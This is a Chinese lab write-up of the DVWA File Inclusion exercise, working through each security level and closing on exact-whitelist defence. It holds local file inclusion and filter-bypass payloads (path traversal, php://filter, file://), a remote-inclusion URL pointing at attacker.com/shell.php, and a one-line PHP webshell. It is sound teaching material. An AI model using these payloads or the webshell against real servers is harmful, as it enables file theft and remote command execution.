DVWA-File Inclusion

- 含义

- File Inclusion——是文件包含漏洞

- 为什么会有 include 这种功能

PHP写网站时，几乎每个页面都有重复的部分——顶部导航栏、底部版权信息、侧边栏菜单。如果每个页面都把这些代码复制一遍，改一行就得改N个文件。

所以PHP提供了 include ：

// 页面顶部统一加载

include('header.php');          // HTML 头部 + 导航栏

include('sidebar.php');         // 侧边栏菜单

// 页面主体内容

include('article_001.php');     // 具体文章内容

// 页面底部

include('footer.php');         // 版权信息

include的作用：把另一个文件的内容"插入"到当前位置，然后执行。被包含的文件如果是PHP代码，会被执行；如果是纯文本，会被原样输出。

- 漏洞怎么来的

正常的代码应该是写死的文件名：

include('header.php');        // 程序员写死的，安全

但程序员有时为了“灵活”，把文件名从用户输入里取：

$page = $_GET['page'];        // 用户传什么就包含什么

include($page);               // ← 漏洞点

用户输入直接成了include的参数——这就是File Inclusion漏洞的本质。

- 危害在哪—— include 和 echo 的本质区别

| 操作 | 后果 |
|---|---|
| echo file_get_contents('x.txt') | 把文件内容当文本显示 |
| include('x.txt') | 把文件内容当代码执行 |

include 会把被包含文件当作 PHP 代码来解析执行。如果文件里有 <?php ... ?>标签，里面的代码会被运行。

- 攻击者的三种利用方式

- LFI（本地文件包含）—— 读系统敏感文件

?page=../../../../Windows/win.ini

服务器执行：include('../../../../Windows/win,ini')

win.ini 是纯文本，没有 <?php 标签，所以被当作文本输出——你看到了 Windows 系统文件的内容。

- PHP封装器 —— 读源码

PHP源码文件里有 <?php 标签，直接 include 会被执行而看不到源码。

?page=php://filter/convert.base54-encode/resource=file1.php

php://filter 是PHP内置的"过滤器",它告诉PHP："读取这个文件，但先base64编码一边再给我"。编码后的内容不包含 <?php 标签，所以不会被当作代码执行，而是作为文本输出——这就是读源码的原理

- RFI（远程文件包含）—— 拿 webshell

?page=http://attacker.com/shell.php

include 会去远程服务器下载 shell.php 并执行。攻击者在 shell.php 里写 <?php system($_GET['cmd']); ?> ，执行后在目标服务器上获得任意命令执行权限。

我现在的环境 allow_url_include=off ，所以方式C被禁用。但是方式A和B完全可用。

- Low级

1、源码分析

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_001.png)

Low 级的根本缺陷：$file = $_GET['page'] 直接来自用户输入，include($file) 原样执行——没有任何输入校验、没有任何协议白名单、没有任何路径限制。攻击者可以传入任意本地路径或 php:// 协议，PHP 引擎照单全收。

2、实操

- 先看正常包含是长什么样

点击页面上的 [file1.php] 链接，URL会变成：

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_002.png)
![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_003.png)

页面内容会变成"File 1"，显示你的用户名和IP。这就是include('file1.php') 的正常效果——执行了 file1.php 里的PHP代码。

- LFI——读取DVWA的文件

- 直接改URL：http://localhost/dvwa/vulnerabilities/fi/?page=C:/Windows/win.ini

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_004.png)

- 修改URL的方案：

- 用绝对路径(最稳)

PHP 的 include 支持绝对路径：

http://localhost/dvwa/vulnerabilities/fi/?page=C:/Windows/win.ini

直接指定盘符和路径,不需要算 ../ 跳几层。

- 如果你不知道文件的绝对路径但是知道大概层级

http://localhost/dvwa/vulnerabilities/fi/?page=../../dvwa/php.ini

- 失败案例

?page=../../../../Windows/win.ini → 失败（空响应）

原因：从 E:\phpstudy_pro\WWW\dvwa\vulnerabilities\fi\ 往上跳 4 层只到 E:\phpstudy_pro\，再往上是 E:\ 根目录，而 Windows 系统在 C 盘——../ 不跨盘符

- php://filter——读取PHP源码

直接 include('file1.php') 看不到源码（PHP代码会被执行而不是显示）。用php://filter 封装器：

http://localhost/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=file1.php

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_005.png)

- 页面显示出了一串 base64编码的字符串

- 把这串base64复制出来，解码后就是file1.php的完整源码。

- 可以在这个网站解码：https://www.base64decode.org/

原理：include('file1.php') 会把文件内容当 PHP 代码执行，<?php 标签内的代码被运行而非显示。
php://filter/convert.base64-encode/resource=file1.php 先把文件内容用 base64 编码，编码后的内容是纯文本（如 PD9waHA...），不含 <?php 标签，PHP 引擎不会把它当代码执行，于是原样输出到页面。
关键不是"读文件"，而是"绕过 PHP 引擎的代码执行"。

3、Linux实战

DVWA 默认是 Linux 环境，这个是 Windows 部署所以读 win.ini。但实战考试/面试中/etc/passwd 才是 LFI 的标志性 payload：

Linux 等价物：?page=/etc/passwd（绝对路径直接读系统用户文件，相当于 Windows 的 C:/Windows/win.ini）

- Medium级

- 源码分析

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_006.png)

防御机制拆解：

Medium 级用了两层黑名单过滤，都是用 str_replace 实现：

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_007.png)

关键缺陷：str_replace 是单次替换，不递归

str_replace 只扫一遍字符串，把出现的 http:// 和 ../ 删掉，但不会回头再检查一次。如果输入里嵌套了 http://，删掉一层后又露出新的 http://，PHP 不会再处理。

这就是字符重组绕过的本质。

- 实操

- LFI路径穿越绕过（ ....// ）重组

- 思路：构造一个输入，删除一层 ../ 后剩余字符还能拼成 ../ 。

原始输入:  ....//

↓ str_replace 删掉中间的 "../"

处理结果:  ../

原理：....// 中间包含 ../，str_replace 删掉中间这部分后，前面剩 ..，后面剩 /，重新拼成了 ../。

- 实操步骤：

- 先用失败的payload做对照组：

http://localhost/dvwa/vulnerabilities/fi/?page=../../../../phpstudy_pro/WWW/dvwa/php.ini

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_008.png)

结果：失败，因为所有 ../ 都被删掉了，路径变成 phpstudy_pro/WWW/dvwa/php.ini，PHP 在当前目录找不到。

- 用重组payload：

http://localhost/dvwa/vulnerabilities/fi/?page=....//....//....//....//phpstudy_pro/WWW/dvwa/php.ini

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_009.png)

- 或者更简洁，从 fi/ 往上跳读 dvwa 目录里的文件：

http://localhost/dvwa/vulnerabilities/fi/?page=....//....//dvwa/php.ini

这个 payload 的意义是：证明 ....// 重组后真的变成了 ../，且能读到目标文件。这才是 Medium 级的核心考点。

- RFI协议重组绕过（ hthttp://tp:// ）

⚠️ 重要前提：环境 allow_url_include = Off，RFI 实际上是不通的。但这个 payload 的逻辑必须学会，因为考试/面试常考。做一次"验证它确实不通"的对照实验。

- 思路：构造一个输入，删除一层 http:// 后剩余字符还能拼成 http://。

原始输入:  hthttp://tp://attack.com/shell.php

↓ str_replace 删掉中间的 "http://"

处理结果:  http://attack.com/shell.php

原理：hthttp://tp:// 中间包含 http://，删掉后前面剩 ht，后面剩 tp://，重新拼成 http://。

- 实操步骤：

- 用重组payload测试RFI：

http://localhost/dvwa/vulnerabilities/fi/?page=hthttp://tp://攻击者服务器/shell.txt

结果：失败。页面报错或空白。

- 对照实验：直接用 http:// （会被过滤但验证协议解析）：

http://localhost/dvwa/vulnerabilities/fi/?page=http://攻击者服务器/shell.txt

结果：http:// 被删掉，变成 攻击者服务器/shell.txt，PHP 当成本地路径找不到，失败。

这个实验的价值：

- ✅ 重组技术本身有效（http:// 被还原）

❌ 但 PHP 配置 allow_url_include=Off 拦在协议层，即使绕过了黑名单，RFI 仍然不通

结论：黑名单是"第一道门"，PHP 配置是"第二道门"，两道门都关了 RFI 才安全

注意：绝对路径 C:/Windows/win.ini 在 Low 和 Medium 级都能成功，因为它不含 ../ 也不含 http://，黑名单根本管不到它。这不是 Medium 级的绕过手法，只是说明黑名单的覆盖面有遗漏。

- 关键结论

- str_replace 防御不可靠：单次替换，可重组绕过

- 真正安全的做法见 Impossible 级（白名单）

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_010.png)

- High级

- 源码分析

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_011.png)

- 防御机制拆解

High 级放弃了 str_replace 黑名单，改用白名单 + 模式匹配。核心是一个判断条件：

if( !fnmatch( "file*", $file ) && $file != "include.php" )

这个条件需要同时满足两个部分才会被拦截（exit）。把它拆开看：

| 条件 | 含义 |
|---|---|
| !fnmatch( "file*", $file ) | $file 不以 file 开头 |
| $file != "include.php" | $file 不等于 include.php |
| 中间的 && | 两个都满足才拦截 |

换句话说，只要满足任意一个就能通过：

- $file 以 file 开头 ✅

- 或者 $file 等于 include.php ✅

关键函数：fnmatch

fnmatch 是PHP的通配符匹配函数，类似shell glob：

| 模式 | 含义 |
|---|---|
| file* | 以 file 开头，后面可以是任何字符（含空字符） |
| *file* | 包含 file |
| file? | file 后跟一个任意字符 |
| file[1-3] | file1 / file2 / file3 |

这里用的是 file*——只检查开头是不是 file，后面随便。

- 防御意图 vs 实际效果

| 开发者意图 | 实际效果 |
|---|---|
| 只允许 file1.php / file2.php / file3.php 这几个白名单文件 | ⚠️ 但 file* 这个匹配模式太宽松了 |
| 用 include.php 作为首页例外 | ✅ 这个没问题 |
| 致命缺陷：开发者漏想了一个以 file 开头的东西——file:// 协议 | 致命缺陷：开发者漏想了一个以 file 开头的东西——file:// 协议 |

核心漏洞：file:// 是 PHP 的本地文件协议，它以 file 开头，完美匹配 file* 模式！

$file = "file:///C:/Windows/win.ini"

↓

fnmatch("file*", $file) → true（以 file 开头）

↓

!fnmatch("file*", $file) → false

↓

条件为 false，不进入 if，不拦截

- 实操

- 验证黑名单类payload失效（对照实验）：

先确认Low/Medium级的payload在High级都失效了：

E:\phpstudy_pro\WWW\dvwa\vulnerabilities\fi（这是网站文件位置）

E:\phpstudy_pro\WWW\dvwa\php.ini（原文件位置）作为跳层级参考

结论：从 fi 跳到dvwa只需要跳两层就行了

?page=../../dvwa/php.ini                ❌ ERROR

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_012.png)

?page=....//....//dvwa/php.ini                                ❌ ERROR

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_013.png)

?page=C:/Windows/win.ini                                        ❌ ERROR

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_014.png)

?page=php://filter/convert.base64-encode/resource=file1.php           ❌ ERROR

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_015.png)

全是因为不以file 开头被堵了

重要发现：High 级实际上比 Medium 级更严格——绝对路径 C:/Windows/win.ini 在 Medium 级能用（因为不含 ../），但 High 级被堵了。

- 用 file:// 协议绕过

- 核心payload：

http://localhost/dvwa/vulnerabilities/fi/?page=file:///C:/Windows/win.ini

- 结构拆解：

- file:// —— PHP本地文件协议

- /C:/ —— Windows盘符表达方式（file:// 协议的规范）

- /Windows/win.ini —— 目标文件绝对路径

- 注意双斜杠和三斜杠：

- file:// + /C:/... = file:///C:/...

- 前两个斜杠是协议分隔符 ://

- 第三个斜杠是 Windows 盘符前的根路径标识

- 实操

修改URL：?page=file:///C:/Windows/win.ini

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_016.png)

结果：成功读取到了 win.ini 的内容。

- 用 file:// 读DVWA源码（复习 php://filter 的等价物）

- file:// 也能读PHP文件，但和 php://filter 有个关键区别：

| 协议 | 读PHP文件的效果 | 原因 |
|---|---|---|
| php://filter/convert.base64-encode/resource=file1.php | 输出base64编码（可解码看源码） | 编码后不含<?php ，不被执行 |
| file:/// E:/phpstudy_pro/WWW/dvwa/vulnerabilities/fi/file1.php | 直接 include执行，看不到源码 | include会把文件当PHP代码执行 |

- 实操

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_017.png)

结果：用 file:// 协议读 file1.php 的源码是看不到的（被 include 执行了），但可以读纯文本文件如 win.ini。

- 能不能用file:// 读DVWA源码？——进阶探索

答案：不能直接读源码，因为 include 会执行 PHP 代码。但是有个技巧——读 .inc / .txt / .bak 等非 .php 后缀的文件。

DVWA 里没有这种文件，所以这个任务在 DVWA 里做不了，但要知道原理。

- 验证 include.php的白名单分支

http://localhost/dvwa/vulnerabilities/fi/?page=include.php

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_018.png)

结果：正常显示首页。这验证了第二个条件分支 $file != "include.php" 的作用。

- 关键结论

- fnmatch("file*") 的缺陷：只查前缀，file:// 协议天然匹配

- 白名单的"范围"比黑名单更难控制：开发者很难穷举所有以 file 开头的东西

- High 级对绝对路径 C:/... 的封堵比 Medium 更严（Medium 漏了，High 堵了）

- 真正安全的做法仍然是 Impossible 级的 in_array 精确白名单

- Impossible级

1、源码分析

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_019.png)

- 防御机制：精确白名单

| 要素 | 说明 |
|---|---|
| 防御方式 | in_array($file, $configFileNames) 精确匹配 |
| 白名单内容 | 只有 4 个文件名：include.php / file1.php / file2.php / file3.php |
| 匹配类型 | 全等精确匹配（in_array 默认 loose 比较，但这里 4 个文件名都是字符串且无数字歧义，实际效果等同精确匹配） |
| 处理方式 | 不在白名单里直接 exit，不执行 include |

2）为什么 Impossible 级无法绕过

| 攻击手法 | 能否绕过 | 原因 |
|---|---|---|
| LFI 相对路径 ../../ | ❌ | 不在白名单 |
| LFI 绝对路径C:/Windows/win.ini | ❌ | 不在白名单 |
| php://filter 读源码 | ❌ | 不在白名单 |
| file:// 协议 | ❌ | 不在白名单 |
| ....// 重组 | ❌ | 不在白名单 |
| hthttp://tp:// 重组 | ❌ | 不在白名单 |

核心原因：Impossible 级根本不解析路径、不解析协议，只比对字符串本身。攻击者输入的任何 payload（无论怎么变形）都不可能等于这 4 个固定字符串之一，除非这 4 个文件名本身就有漏洞（这里没有）。

2、实操

?page=file1.php     → ✅ 正常显示

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_020.png)

?page=file2.php     → ✅ 正常显示

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_021.png)

?page=include.php   → ✅ 正常显示

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_022.png)

?page=anything_else  → ❌ ERROR

![](images/6-DVWA-File-Inclusion-文件包含漏洞/6-DVWA-File-Inclusion-文件包含漏洞_023.png)

- 总结

1、File Inclusion 四级对比（核心）

1）	防御机制对比

| 级别 | 防御方式 | 核心代码 | 防御思路 |
|---|---|---|---|
| Low | 无防御 | $file = $_GET['page'] | 无 |
| Medium | 黑名单删除 | str_replace(array("http://","../"), "", $file) | 删掉危险字符 |
| High | 模式匹配白名单 | fnmatch("file*", $file) | 只允许 file 开头 |
| Impossible | 精确白名单 | in_array($file, $configFileNames) | 只允许固定文件名 |

- 绕过手法对比

| 级别 | 绕过 payload | 原理 |
|---|---|---|
| Low | ?page=C:/Windows/win.ini ?page=php://filter/convert.base64-encode/resource=file1.php` | 零过滤，直接读 |
| Medium | ?page=....//....//dvwa/php.ini ?page=hthttp://tp://attacker/shell.txt | str_replace 单次替换，重组后还原 |
| High | ?page=file:///C:/Windows/win.ini | file:// 以 file 开头，匹配 file* 模式 |
| Impossible | 无 | 精确白名单，无法绕过 |

- 缺陷本质对比

| 级别 | 缺陷本质 | 教训 |
|---|---|---|
| Low | 完全信任用户输入 | 永远不能直接 include 用户输入 |
| Medium | 黑名单 + 单次替换 | ① 黑名单永远列不全  ② str_replace 不递归，可重组绕过 |
| High | 模式匹配范围太宽 | 白名单的"模式"比"精确值"更难控制，file* 漏了 file:// 协议 |
| Impossible | 无缺陷 | 精确白名单是文件包含漏洞的正确解法 |

2、File Inclusion 知识体系

1）漏洞定义

File Inclusion（文件包含）：

PHP 的 include / require / include_once / require_once 把用户输入当作文件路径执行，导致攻击者可以包含任意文件。

2）两种攻击类型

| 类型 | 全称 | 条件 | 危害 |
|---|---|---|---|
| LFI | Local File Inclusion | 无特殊条件 | 读任意本地文件、读源码 |
| RFI | Remote File Inclusion | allow_url_include = On | 执行远程恶意代码 →  直接 getshell |

3）常用协议/手法清单

| 协议/手法 | 用途 | 适用级别 |
|---|---|---|
| 绝对路径 C:/... | 读本地系统文件 | Low / Medium |
| 相对路径 ../../ | 路径穿越读本地文件 | Low（Medium 需....//重组） |
| php://filter | 读 PHP 源码（base64 编码绕过执行） | Low |
| file:// | 本地文件协议，匹配file*模式 | High |
| http:// / https:// | RFI 远程包含 | 需 allow_url_include=On |

4. 防御原则（从弱到强）

无防御 → 黑名单(str_replace) → 模式白名单(fnmatch) → 精确白名单(in_array)

低          中(可绕过)            中(可绕过)              高(无法绕过)

核心原则：文件包含的正确防御只有精确白名单，黑名单和模式匹配都有绕过空间。
